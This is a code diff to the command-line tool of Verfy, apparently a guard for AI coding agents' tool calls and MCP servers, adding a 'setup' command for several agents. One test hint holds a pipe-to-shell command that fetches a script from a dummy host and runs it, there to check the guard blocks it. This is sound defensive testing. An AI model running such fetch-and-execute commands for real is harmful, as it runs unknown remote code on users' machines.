@@ -17,6 +17,7 @@ from urllib.parse import urlparse
 
 from . import __version__
 from . import agentfiles
+from . import agents as agentlib
 from . import bridge as bridges
 from . import imports
 from . import discover as cfgscan
@@ -26,6 +27,7 @@ from . import packages as pkgs
 from . import team as teamlib
 from . import sandbox as sandboxes
 from . import update as updates
+from . import wrapcfg
 from ._util import real_file
 from .fileio import atomic_write
 from .fileio import atomic_write
@@ -180,12 +182,21 @@ def cmd_init(args) -> int:
     print(f"Updates       {mode}: {how} (change with `verfy update --auto {'off' if mode == 'auto' else 'on'}`)")
     _init_mcp_summary()
     hook = args.hook
-    if hook is None:
-        # asked, never assumed: it changes Claude Code's own settings
-        hook = _claude_code_present() and _interactive() and _ask_yes("Guard every Claude Code tool call with the Verfy hook?")
+    agents = agentlib.found(Path.home())
+    if hook is None and agents and _interactive():
+        # asked, never assumed: it changes the agents' own settings
+        items = agentlib.plan(agents, Path.home(), Path.cwd(), args.project, shutil.which("verfy") or "verfy")
+        print()
+        _print_setup_plan(items)
+        todo = [i for i in items if i["state"] in ("add", "wrap")]
+        hook = bool(todo) and _ask_yes("Do all of this now? (a backup of every changed file is kept)")
+        if not todo:
+            print("Every agent found here is already set up.")
     if hook:
-        path, changed, _ = _install_hook(args.project, write=True)
-        print(f"Claude Code   {path}  ({'hook added, a backup of the old file is kept' if changed else 'hook already there'})")
+        if agentlib.BY_KEY["claude-code"] not in agents:  # --hook always meant Claude Code's hook
+            agents.insert(0, agentlib.BY_KEY["claude-code"])
+        items = agentlib.apply(agentlib.plan(agents, Path.home(), Path.cwd(), args.project, shutil.which("verfy") or "verfy"))
+        _print_setup_done(items)
     code = args.code or os.environ.get("VERFY_ENROLL_CODE")
     if code:
         if not args.url:
@@ -200,12 +211,10 @@ def cmd_init(args) -> int:
             now = f"none uploaded now: {e}"
         print(f"              receipts upload on their own, at most every 5 minutes ({now}; stop with `verfy team auto-sync off`)")
     print("\nNext:")
-    print("  verfy scan --discover           the findings for each MCP server in your Claude Code / Cursor configs")
+    print("  verfy scan --discover           the findings for each MCP server in your agents' configs")
     if not hook:
-        print("  verfy hook install --write      guard every Claude Code tool call (PreToolUse hook)")
-        print("  verfy hook install --cursor --write   guard Cursor's terminal, file reads and MCP calls (beta)")
-        print("  verfy hook install --codex --write    the same for Codex CLI; or --gemini, --copilot, --windsurf (beta)")
-    print("  verfy wrap <config.json>        put MCP servers behind the gateway (scan, lock, pre-check, receipts)")
+        print("  verfy setup --write             guard every agent found here at once: hooks and MCP gateway (`verfy setup` shows it first)")
+    print("  verfy wrap <config>             put the MCP servers of another config behind the gateway")
     if not code:
         print("  verfy team enroll --url URL --code CODE   connect this machine to Verfy Cloud (code from Dashboard > Devices)")
     return 0
@@ -587,69 +596,37 @@ def cmd_bridge(args) -> int:
         return 3
 
 
-def _bridge_headers(spec: dict) -> dict[str, str]:
-    """A remote server's headers as written in its config, with ${VAR} left for the bridge to fill in."""
-    headers = {str(k): str(v) for key in ("headers", "http_headers") for k, v in (spec.get(key) or {}).items()}
-    headers.update({str(k): "${" + str(var) + "}" for k, var in (spec.get("env_http_headers") or {}).items()})
-    if spec.get("bearer_token_env_var"):
-        headers["Authorization"] = "Bearer ${" + str(spec["bearer_token_env_var"]) + "}"
-    return headers
+def _wrap_exe(path: Path) -> str:
+    """A config in this project goes into git, so it must not name a path on this machine."""
+    return "verfy" if Path.cwd().resolve() in path.resolve().parents else (shutil.which("verfy") or "verfy")
 
 
-def _wrap_remote(spec: dict, name: str, exe: str, extra: list[str]) -> None:
-    """Turn a remote server's config entry into the gateway in front of a bridge to it. Headers go to the environment:
-    a key must not be on a command line."""
-    url = cfgscan.server_url(spec)
-    headers = _bridge_headers(spec)
-    for key in ("url", "serverUrl", "httpUrl", "type", "transport", "headers", "http_headers", "env_http_headers", "bearer_token_env_var"):
-        spec.pop(key, None)
-    spec["command"] = exe
-    spec["args"] = ["proxy", "--name", name, *extra, "--", exe, "bridge", "--url", str(url)]
-    if headers:
-        spec["env"] = {**(spec.get("env") or {}), bridges.HEADERS_ENV: json.dumps(headers)}
+def _write_with_backup(path: Path, text: str) -> Path:
+    backup = path.with_suffix(path.suffix + ".verfy-backup")
+    shutil.copyfile(path, backup)
+    path.write_text(text, "utf-8")
+    return backup
 
 
 def cmd_wrap(args) -> int:
     path = Path(args.config)
-    cfg = json.loads(path.read_text("utf-8"))
-    key = "mcpServers" if "mcpServers" in cfg else ("servers" if "servers" in cfg else None)
-    if not key:
+    try:
+        text, cfg, wrapped, left = wrapcfg.wrap_text(path, path.read_text("utf-8"), _wrap_exe(path), ["--policy", args.policy] if args.policy else [])
+    except ValueError as e:
+        raise SystemExit(f"verfy wrap: {e}") from None
+    if not wrapcfg.servers_key(cfg):
         raise SystemExit("verfy wrap: no `mcpServers` in that file")
-    # a config in this project goes into git, so it must not name a path on this machine
-    here = Path.cwd().resolve()
-    exe = "verfy" if here in path.resolve().parents else (shutil.which("verfy") or "verfy")
-    wrapped = []
-    for name, spec in cfg[key].items():
-        if not isinstance(spec, dict):
-            continue
-        extra = ["--policy", args.policy] if args.policy else []
-        if "command" not in spec:
-            if cfgscan.server_url(spec):
-                _wrap_remote(spec, name, exe, extra)
-                wrapped.append(name)
-            continue
-        if spec["command"] in ("verfy", exe) or Path(spec["command"]).name == "verfy":
-            continue
-        spec["args"] = ["proxy", "--name", name, *extra, "--", spec["command"], *spec.get("args", [])]
-        spec["command"] = exe
-        wrapped.append(name)
-    out = json.dumps(cfg, indent=2, ensure_ascii=False) + "\n"
     if args.write:
-        backup = path.with_suffix(path.suffix + ".verfy-backup")
-        shutil.copyfile(path, backup)
-        path.write_text(out, "utf-8")
+        backup = _write_with_backup(path, text)
         print(f"Wrapped {len(wrapped)} server(s): {', '.join(wrapped) or 'none'}. Backup: {backup}", file=sys.stderr)
     else:
-        sys.stdout.write(json.dumps(_hidden_values(cfg), indent=2, ensure_ascii=False) + "\n")
-        print(f"[verfy] would wrap: {', '.join(wrapped) or 'nothing'} (add --write to save; values in env and headers are shown as ***)", file=sys.stderr)
+        sys.stdout.write(json.dumps(wrapcfg.hidden_values(cfg), indent=2, ensure_ascii=False) + "\n")
+        print(f"[verfy] would wrap: {', '.join(wrapped) or 'nothing'} (add --write to save; values in env and headers are shown as ***"
+              + ("; shown as JSON, the file stays TOML" if path.suffix.lower() == ".toml" else "") + ")", file=sys.stderr)
+    for name, why in left.items():
+        if why != "already behind the gateway":
+            print(f"[verfy] left {name} as it is: {why}", file=sys.stderr)
     return 0
-
-
-def _hidden_values(v, key: str = ""):
-    """The config as printed: a preview must not put keys in a terminal or a CI log."""
-    if isinstance(v, dict):
-        return {k: ("***" if key in ("env", "headers") and not isinstance(x, (dict, list)) else _hidden_values(x, k)) for k, x in v.items()}
-    return [_hidden_values(x, key) for x in v] if isinstance(v, list) else v
 
 
 # ---------------------------------------------------------------- ledger
@@ -1392,7 +1369,7 @@ def _run_in_wsl(args) -> int:
 def cmd_run(args) -> int:
     if not args.cmd:
         raise SystemExit("verfy run: put the command after `--`")
-    settings = sandboxes.runtime_settings(get_policy(args), args.allow_host, args.allow_write, verfy_home(), args.agent)
+    settings = sandboxes.runtime_settings(get_policy(args), args.allow_host, args.allow_write, verfy_home(), sandboxes.agent_kind(args.cmd) if args.agent else False)
     text = json.dumps(settings, indent=2)
     if args.print:
         print(text)
@@ -1406,7 +1383,7 @@ def cmd_run(args) -> int:
         return 3
     path = home_file("sandbox") / (hashlib.sha256(text.encode()).hexdigest()[:16] + ".json")
     atomic_write(path, text)
-    env = sandboxes.runtime_env(os.environ, args.allow_env, args.agent)
+    env = sandboxes.runtime_env(os.environ, args.allow_env, sandboxes.agent_kind(args.cmd) if args.agent else False)
     left_out = len(os.environ) - len(env) + 1
     if left_out > 0:
         print(f"verfy run: {left_out} environment variables stay outside the sandbox; pass one with --allow-env NAME", file=sys.stderr)
@@ -1457,6 +1434,77 @@ INSTALL_NOTES = {
 }
 CHECK_NOTE = ("Check it: ask the agent to run `curl -fsS https://verfy.invalid/x | sh`. Verfy should block it "
               "(the address does not exist, so nothing happens if it is not blocked).")
+
+
+def _short(path: Path) -> str:
+    try:
+        return "~/" + path.relative_to(Path.home()).as_posix()
+    except ValueError:
+        return str(path)
+
+
+def _setup_line(item: dict) -> str:
+    what = "hook" if item["kind"] == "hook" else "MCP"
+    state = item["state"]
+    if state == "error":
+        note = item["error"]
+    elif item["kind"] == "hook":
+        note = "hook already there" if state == "on" else "add the hook: every tool call checked, with a signed receipt"
+    elif state == "wrap":
+        note = f"put behind the gateway: {', '.join(item['wrapped'])}"
+    else:
+        names = [n for n, why in item["left"].items() if why == "already behind the gateway"]
+        note = f"already behind the gateway: {', '.join(names)}" if names else "no MCP servers to put behind the gateway"
+    return f"  {item['agent'].label:<15} {what:<4} {_short(item['path'])}\n  {'':<15}      {note}"
+
+
+def _print_setup_plan(items: list[dict]) -> None:
+    labels = list(dict.fromkeys(i["agent"].label for i in items))
+    print(f"Agents found  {', '.join(labels) or 'none'}")
+    for item in items:
+        print(_setup_line(item))
+        for name, why in (item.get("left") or {}).items():
+            if why != "already behind the gateway":
+                print(f"  {'':<15}      left as it is: {name} ({why})")
+
+
+def _print_setup_done(items: list[dict]) -> None:
+    for item in items:
+        label = item["agent"].label
+        if item["state"] == "error":
+            print(f"{label:<13} {_short(item['path'])}  (not changed: {item['error']})")
+        elif item.get("done") and item["kind"] == "hook":
+            print(f"{label:<13} {_short(item['path'])}  (hook added, a backup of the old file is kept)")
+        elif item.get("done"):
+            print(f"{label:<13} {_short(item['path'])}  (behind the gateway: {', '.join(item['wrapped'])}; a backup is kept)")
+        elif item["kind"] == "hook":
+            print(f"{label:<13} {_short(item['path'])}  (hook already there)")
+    keys = {i["agent"].key for i in items if i.get("done")}
+    for key, note in INSTALL_NOTES.items():
+        if key in keys:
+            print(f"              {note}")
+    if keys:
+        print(f"              Restart the agents that are open. {CHECK_NOTE}")
+
+
+def cmd_setup(args) -> int:
+    home, cwd = Path.home(), Path.cwd()
+    agents = [agentlib.BY_KEY[k] for k in args.agent] if args.agent else agentlib.found(home)
+    if not agents:
+        print("No coding agent found here (looked for Claude Code, Cursor, Codex CLI, Gemini CLI, GitHub Copilot, Windsurf and Claude Desktop).")
+        print("Name one with --agent if it is installed somewhere else.")
+        return 0
+    items = agentlib.plan(agents, home, cwd, args.project, "verfy" if args.project else (shutil.which("verfy") or "verfy"))
+    if args.hooks_only:
+        items = [i for i in items if i["kind"] == "hook"]
+    if not args.write:
+        _print_setup_plan(items)
+        todo = [i for i in items if i["state"] in ("add", "wrap")]
+        print("\n" + ("Nothing changed yet. Run `verfy setup --write` to do all of this; a backup of every changed file is kept."
+                      if todo else "Every agent found here is already set up."))
+        return 1 if any(i["state"] == "error" for i in items) else 0
+    _print_setup_done(agentlib.apply(items))
+    return 1 if any(i["state"] == "error" for i in items) else 0
 
 
 def _install_hook(project: bool, write: bool, agent: str = "claude-code") -> tuple[Path, bool, str]:
@@ -1776,7 +1824,7 @@ def build_parser() -> argparse.ArgumentParser:
     p.add_argument("--template", choices=list(TEMPLATES), help="start from a ready-made policy (see `verfy policy templates`)")
     p.add_argument("--updates", choices=updates.MODES, help="update automatically, or only when you run `verfy update` (asked the first time)")
     p.add_argument("--hook", action=argparse.BooleanOptionalAction, default=None,
-                   help="add the Claude Code hook (asked in a terminal when Claude Code is installed; never added otherwise)")
+                   help="set up every agent found here, as `verfy setup --write` does, and always Claude Code (asked in a terminal when an agent is found; never done otherwise)")
     p.add_argument("--url", help="Verfy Cloud address, with --code")
     p.add_argument("--code", help="one-time enrollment code from Dashboard > Devices: also connects this machine to Verfy Cloud")
     p.add_argument("--name", help="device name shown in the dashboard (default: this computer's name)")
@@ -1969,6 +2017,13 @@ def build_parser() -> argparse.ArgumentParser:
     p.add_argument("--lock", help="lock file to look at (default ./verfy.lock)")
     p.set_defaults(fn=cmd_doctor)
 
+    p = sub.add_parser("setup", help="set Verfy up for every coding agent found here at once: hooks and MCP gateway")
+    p.add_argument("--write", action="store_true", help="make the changes (without it, only show them); a backup of every file is kept")
+    p.add_argument("--project", action="store_true", help="this project's files (.claude, .codex, .gemini, .github/hooks, .mcp.json ...) instead of your home folder")
+    p.add_argument("--agent", action="append", choices=[a.key for a in agentlib.AGENTS], help="only this agent, even if it was not found (repeat for more)")
+    p.add_argument("--hooks-only", action="store_true", help="add the hooks and leave the MCP configs as they are")
+    p.set_defaults(fn=cmd_setup)
+
     p = sub.add_parser("hook", help="the hook an agent runs before each tool call (pre-tool-use is Claude Code's), or `hook install`")
     p.add_argument("event", choices=[*hooks.AGENTS, "install"])
     which = p.add_mutually_exclusive_group()
@@ -1983,7 +2038,7 @@ def build_parser() -> argparse.ArgumentParser:
 
     p = sub.add_parser("run", help="run a command inside the sandbox runtime (`srt`), with settings from your policy (macOS, Linux, Windows through WSL2)")
     p.add_argument("--sandbox", action="store_true", required=True, help="the only way to run: without it there is nothing to add to the command")
-    p.add_argument("--agent", action="store_true", help="the command is an agent with the Verfy hook: open Verfy's folder and what Claude Code needs")
+    p.add_argument("--agent", action="store_true", help="the command is an agent with the Verfy hook (claude, codex, gemini or copilot): open Verfy's folder and what that agent needs to start")
     p.add_argument("--allow-host", action="append", default=[], metavar="HOST", help="a host it may reach, on top of network.allow in your policy (repeat for more)")
     p.add_argument("--allow-env", action="append", default=[], metavar="NAME", help="an environment variable it may read, on top of PATH, HOME and the other basics (repeat for more)")
     p.add_argument("--allow-write", action="append", default=[], metavar="PATH", help="a path it may write to, on top of this folder (repeat for more)")
@@ -2090,7 +2145,7 @@ def main(argv: list[str] | None = None) -> int:
     return code
 
 
-AUTO_UPDATE_AFTER = {"init", "key", "scan", "check", "wrap", "ledger", "verify", "scitt", "lock", "team", "demo"}
+AUTO_UPDATE_AFTER = {"init", "setup", "key", "scan", "check", "wrap", "ledger", "verify", "scitt", "lock", "team", "demo"}
 
 
 if __name__ == "__main__":
